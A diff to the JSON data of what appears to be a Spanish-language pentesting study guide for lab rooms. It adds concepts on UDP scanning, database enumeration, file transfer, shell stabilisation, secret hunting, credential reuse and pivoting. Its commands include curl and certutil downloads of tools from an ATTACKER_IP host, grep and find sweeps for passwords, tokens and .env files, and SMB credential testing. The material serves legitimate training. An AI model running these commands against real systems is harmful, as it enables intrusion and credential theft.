@@ -5,7 +5,7 @@
     "totalCommands": 441,
     "totalTags": 9,
     "totalGuides": 10,
-    "totalConcepts": 59,
+    "totalConcepts": 66,
     "totalPaths": 14
   },
   "tags": [
@@ -7079,6 +7079,323 @@
           "out": "Tipos, campos y operaciones disponibles."
         }
       ]
+    },
+    {
+      "id": "tcp-vs-udp",
+      "title": "TCP frente a UDP",
+      "phase": "recon",
+      "section": "recon-y-servicios",
+      "summary": "Interpretar protocolos y no perder servicios UDP durante el reconocimiento.",
+      "que": "TCP confirma una conexion orientada a estado; UDP no establece handshake y requiere sondas especificas.",
+      "porque": "Un escaneo TCP completo puede dejar fuera DNS, SNMP, TFTP o servicios de voz expuestos por UDP.",
+      "cuando": "Cuando el objetivo parece vacio en TCP o aparecen puertos UDP habituales como 53, 161 o 69.",
+      "no_aplica": [
+        "No lo priorices si el alcance solo autoriza TCP y la evidencia confirma que no hay UDP."
+      ],
+      "confirmacion": "Compara un barrido TCP con una sonda UDP sobre puertos esperados y registra estados open|filtered.",
+      "resultado": "Tienes una superficie de red completa y sabes que resultados UDP necesitan una segunda comprobacion.",
+      "necesitas": [
+        "IP objetivo",
+        "alcance autorizado",
+        "lista de puertos UDP prioritarios"
+      ],
+      "senales": [
+        "open|filtered",
+        "53/udp",
+        "161/udp",
+        "sin respuesta TCP"
+      ],
+      "pasos": [
+        "Escanea TCP.",
+        "Sondea UDP prioritario.",
+        "Enumera cada servicio confirmado."
+      ],
+      "commands": [
+        {
+          "cmd": "nmap -sU -Pn -p 53,69,123,161 $IP",
+          "why": "Comprueba UDP de alto valor sin barrer todo a ciegas.",
+          "out": "Puertos open o open|filtered para profundizar."
+        },
+        {
+          "cmd": "nmap -sU -sV -Pn -p <PUERTOS_UDP> $IP",
+          "why": "Identifica versiones en los UDP que merecen seguimiento.",
+          "out": "Banner o respuesta del servicio."
+        }
+      ]
+    },
+    {
+      "id": "database-enumeration",
+      "title": "Enumeracion de bases de datos",
+      "phase": "enumeration",
+      "section": "recon-y-servicios",
+      "summary": "Reconocer motores, autenticacion, bases visibles y credenciales de servicios de datos.",
+      "que": "La enumeracion de una base de datos empieza por version, acceso y permisos antes de intentar extraer datos.",
+      "porque": "Una credencial reutilizada o una instancia sin restricciones puede abrir el camino a la aplicacion o al sistema.",
+      "cuando": "Cuando aparecen 3306, 1433, 5432, 6379 u otro puerto de base de datos.",
+      "no_aplica": [
+        "No aplica si el puerto solo corresponde a un proxy sin backend de datos confirmado."
+      ],
+      "confirmacion": "Identifica el motor y obtiene una respuesta de autenticacion, incluso si es un rechazo controlado.",
+      "resultado": "Sabes que protocolo usar, que cuenta probar y donde buscar secretos de conexion.",
+      "necesitas": [
+        "host y puerto",
+        "cliente del motor",
+        "credenciales de laboratorio si existen"
+      ],
+      "senales": [
+        "banner MySQL/PostgreSQL/MSSQL",
+        "redis-cli",
+        "login required",
+        "version"
+      ],
+      "pasos": [
+        "Identifica el motor.",
+        "Comprueba acceso anonimo o con credenciales validas.",
+        "Enumera bases y permisos."
+      ],
+      "commands": [
+        {
+          "cmd": "nmap -sV -p 3306,1433,5432,6379 $IP",
+          "why": "Confirma banners y versiones de motores comunes.",
+          "out": "Servicio, version y pistas de autenticacion."
+        },
+        {
+          "cmd": "mysql -h $IP -u root -p",
+          "why": "Prueba el cliente MySQL solo con credenciales autorizadas.",
+          "out": "Acceso, rechazo o politica de autenticacion."
+        },
+        {
+          "cmd": "redis-cli -h $IP info server",
+          "why": "Comprueba si Redis expone informacion sin autenticacion.",
+          "out": "Version y estado; un acceso abierto requiere documentar impacto."
+        }
+      ]
+    },
+    {
+      "id": "file-transfer",
+      "title": "Transferencia de ficheros",
+      "phase": "access",
+      "section": "acceso-inicial",
+      "summary": "Mover herramientas y evidencias entre atacante y objetivo de forma reproducible.",
+      "que": "La transferencia debe adaptarse al sistema, permisos, red y controles disponibles en el laboratorio.",
+      "porque": "Una shell limitada no sirve si no puedes subir un binario, descargar una evidencia o verificar su integridad.",
+      "cuando": "Cuando necesitas llevar una herramienta, un script o un archivo de salida al otro extremo.",
+      "no_aplica": [
+        "No aplica si todas las pruebas se ejecutan desde una consola remota con herramientas ya disponibles."
+      ],
+      "confirmacion": "El fichero llega al destino y su hash coincide con el original cuando el caso lo requiere.",
+      "resultado": "Puedes elegir un canal de transferencia compatible sin mezclarlo con la logica de explotacion.",
+      "necesitas": [
+        "IP y puerto del canal",
+        "ruta de origen y destino",
+        "hash si el binario es sensible"
+      ],
+      "senales": [
+        "HTTP 200",
+        "bytes recibidos",
+        "certutil",
+        "wget/curl"
+      ],
+      "pasos": [
+        "Elige canal.",
+        "Transfiere un fichero pequeno de prueba.",
+        "Verifica existencia e integridad."
+      ],
+      "commands": [
+        {
+          "cmd": "python3 -m http.server 8000",
+          "why": "Sirve un directorio local para descargas desde el objetivo.",
+          "out": "Servidor escuchando en el puerto elegido."
+        },
+        {
+          "cmd": "curl -o /tmp/tool http://ATTACKER_IP:8000/tool",
+          "why": "Descarga desde una shell Linux cuando curl esta disponible.",
+          "out": "Bytes recibidos y fichero en destino."
+        },
+        {
+          "cmd": "certutil -urlcache -split -f http://ATTACKER_IP:8000/tool C:\\Windows\\Temp\\tool.exe",
+          "why": "Alternativa nativa para Windows sin asumir wget.",
+          "out": "Fichero descargado en la ruta indicada."
+        }
+      ]
+    },
+    {
+      "id": "shell-troubleshooting",
+      "title": "Diagnostico de shells",
+      "phase": "access",
+      "section": "acceso-inicial",
+      "summary": "Resolver timeouts, listeners incorrectos, TTY rota y sesiones que mueren.",
+      "que": "Una shell es una cadena de red y proceso: listener, payload, ruta, permisos y terminal deben encajar.",
+      "porque": "La mayoria de fallos de reverse shell son de IP, puerto, firewall o TTY, no del payload en si.",
+      "cuando": "Cuando la conexion no llega, se cierra al instante o no permite usar comandos interactivos.",
+      "no_aplica": [
+        "No aplica a una sesion SSH estable que ya ofrece una terminal completa."
+      ],
+      "confirmacion": "Comprueba por separado listener, conectividad, proceso remoto y calidad de la TTY.",
+      "resultado": "Aíslas la capa que falla y corriges una variable cada vez.",
+      "necesitas": [
+        "IP atacante alcanzable",
+        "puerto libre",
+        "shell o comando remoto"
+      ],
+      "senales": [
+        "connection refused",
+        "timeout",
+        "prompt ausente",
+        "Ctrl+C rompe la shell"
+      ],
+      "pasos": [
+        "Valida listener e IP.",
+        "Prueba conectividad minima.",
+        "Estabiliza o cambia de canal."
+      ],
+      "commands": [
+        {
+          "cmd": "ss -ltnp | grep 4444",
+          "why": "Confirma que el listener esta abierto en el puerto esperado.",
+          "out": "Proceso escuchando en 0.0.0.0:4444 o interfaz correcta."
+        },
+        {
+          "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+          "why": "Crea una pseudo-TTY cuando la shell Linux es interactiva pero limitada.",
+          "out": "Prompt utilizable para completar la estabilizacion."
+        }
+      ]
+    },
+    {
+      "id": "secrets-and-loot",
+      "title": "Secretos y loot",
+      "phase": "access",
+      "section": "loot-y-secretos",
+      "summary": "Buscar, clasificar y reutilizar secretos sin perder el contexto de donde salieron.",
+      "que": "Loot es cualquier evidencia o secreto que cambia tus siguientes decisiones: configs, claves, tokens, hashes y backups.",
+      "porque": "Un secreto aislado solo sirve si sabes a que servicio, usuario y alcance pertenece.",
+      "cuando": "Tras obtener acceso a ficheros, shares, historiales, variables de entorno o volcados de memoria.",
+      "no_aplica": [
+        "No priorices una busqueda masiva si aun no has enumerado rutas y permisos basicos."
+      ],
+      "confirmacion": "Cada secreto queda asociado a origen, usuario, servicio y prueba de validez autorizada.",
+      "resultado": "Tienes un inventario limpio de loot y sabes cual merece probarse primero.",
+      "necesitas": [
+        "acceso de lectura",
+        "directorio de trabajo",
+        "regla para no exfiltrar datos innecesarios"
+      ],
+      "senales": [
+        "password=",
+        "token",
+        ".env",
+        "history",
+        "backup"
+      ],
+      "pasos": [
+        "Busca con alcance.",
+        "Clasifica por servicio y usuario.",
+        "Valida y documenta reutilizacion."
+      ],
+      "commands": [
+        {
+          "cmd": "grep -RInE 'password|passwd|token|secret|api[_-]?key' /var/www 2>/dev/null",
+          "why": "Busca indicadores comunes en una ruta de aplicacion acotada.",
+          "out": "Ficheros y lineas candidatas para revisar manualmente."
+        },
+        {
+          "cmd": "find / -type f \\( -name '.env' -o -name '*history*' -o -name '*.bak' \\) 2>/dev/null",
+          "why": "Localiza fuentes habituales de secretos sin volcar todo el sistema.",
+          "out": "Rutas candidatas y permisos de lectura."
+        }
+      ]
+    },
+    {
+      "id": "credential-reuse",
+      "title": "Reutilizacion de credenciales",
+      "phase": "access",
+      "section": "credenciales-y-acceso",
+      "summary": "Convertir una credencial validada en nuevas pistas sin hacer spraying indiscriminado.",
+      "que": "Reutilizar es probar una credencial concreta en servicios y usuarios relacionados con la evidencia original.",
+      "porque": "Los labs y entornos reales repiten passwords entre SSH, SMB, WinRM, paneles y bases de datos.",
+      "cuando": "Cuando encuentras una password, hash, clave privada o token con usuario y contexto identificables.",
+      "no_aplica": [
+        "No hagas spraying masivo ni pruebes credenciales fuera del alcance autorizado."
+      ],
+      "confirmacion": "Un login exitoso se confirma con el servicio, usuario y permisos observados.",
+      "resultado": "Amplias acceso de forma controlada y sabes que credencial abre cada puerta.",
+      "necesitas": [
+        "credencial y usuario",
+        "lista corta de servicios",
+        "politica de bloqueo conocida"
+      ],
+      "senales": [
+        "SSH success",
+        "SMB [+]",
+        "WinRM prompt",
+        "HTTP 401/200"
+      ],
+      "pasos": [
+        "Prioriza servicios cercanos.",
+        "Prueba una credencial cada vez.",
+        "Reenumera con el contexto nuevo."
+      ],
+      "commands": [
+        {
+          "cmd": "nxc smb $IP -u $USER -p '$PASS' --shares",
+          "why": "Comprueba la credencial en SMB y enumera shares en una sola peticion.",
+          "out": "Resultado [+]/[-], dominio y permisos por share."
+        },
+        {
+          "cmd": "ssh $USER@$IP",
+          "why": "Prueba acceso SSH cuando la evidencia apunta a Linux.",
+          "out": "Shell o rechazo con razon concreta."
+        }
+      ]
+    },
+    {
+      "id": "pivot-troubleshooting",
+      "title": "Diagnostico de pivoting",
+      "phase": "pivot",
+      "section": "pivoting",
+      "summary": "Comprobar rutas, listeners y alcance cuando el tunel existe pero no llega al servicio interno.",
+      "que": "Pivoting depende de que la ruta, el proceso de tunel y el proxy conozcan correctamente cada red.",
+      "porque": "Un tunel activo no garantiza que el trafico use la interfaz o el puerto correctos.",
+      "cuando": "Cuando ves la maquina pivote pero un servicio interno da timeout o connection refused.",
+      "no_aplica": [
+        "No aplica si el objetivo interno es directamente alcanzable desde tu maquina."
+      ],
+      "confirmacion": "Comprueba interfaz interna, ruta, escucha del proxy y conexion desde el punto correcto.",
+      "resultado": "Sabes si falla el tunel, el proxy, la ruta o el servicio objetivo.",
+      "necesitas": [
+        "acceso al pivote",
+        "subred interna",
+        "puerto del tunel"
+      ],
+      "senales": [
+        "timeout",
+        "proxy error",
+        "route missing",
+        "listener activo"
+      ],
+      "pasos": [
+        "Inspecciona interfaces.",
+        "Comprueba rutas y listener.",
+        "Prueba desde el pivote y desde proxychains."
+      ],
+      "commands": [
+        {
+          "cmd": "ip addr; ip route",
+          "why": "Revela interfaces y redes que realmente ve el pivote.",
+          "out": "Subred interna, gateway y rutas disponibles."
+        },
+        {
+          "cmd": "ss -ltnp",
+          "why": "Confirma que el servicio de tunel o proxy escucha donde esperas.",
+          "out": "Puerto, interfaz y proceso propietario."
+        },
+        {
+          "cmd": "proxychains -q nmap -Pn -p <PUERTO> <IP_INTERNA>",
+          "why": "Valida el camino completo hacia un servicio interno.",
+          "out": "open, filtered o timeout a traves del proxy."
+        }
+      ]
     }
   ],
   "paths": [
@@ -7124,7 +7441,9 @@
       "summary": "Ya tienes ejecucion de comandos: como convertirla en una shell usable. Reverse vs bind y por que hay que estabilizar la TTY.",
       "concepts": [
         "reverse-vs-bind",
-        "tty-stabilization"
+        "tty-stabilization",
+        "file-transfer",
+        "shell-troubleshooting"
       ]
     },
     {
@@ -7160,7 +7479,8 @@
       "title": "Reconocimiento de red",
       "summary": "La primera fase de toda room: de puertos a servicios identificados, antes de enumerar cada uno.",
       "concepts": [
-        "recon-metodologia"
+        "recon-metodologia",
+        "tcp-vs-udp"
       ]
     },
     {
@@ -7174,7 +7494,8 @@
         "snmp-enum",
         "nfs-enum",
         "ldap-enum",
-        "smtp-enum"
+        "smtp-enum",
+        "database-enumeration"
       ]
     },
     {
@@ -7182,8 +7503,10 @@
       "title": "Credenciales y hashes",
       "summary": "Conseguir credenciales: fuerza bruta online a un login, o crackear un hash offline; y sobre todo reutilizarlas.",
       "concepts": [
+        "secrets-and-loot",
+        "cracking",
         "fuerza-bruta-online",
-        "cracking"
+        "credential-reuse"
       ]
     },
     {
@@ -7236,7 +7559,8 @@
       "title": "Pivoting",
       "summary": "Cuando la maquina comprometida ve una red interna que tu no alcanzas: usarla de puente con tuneles.",
       "concepts": [
-        "pivoting-tunel"
+        "pivoting-tunel",
+        "pivot-troubleshooting"
       ]
     }
   ]
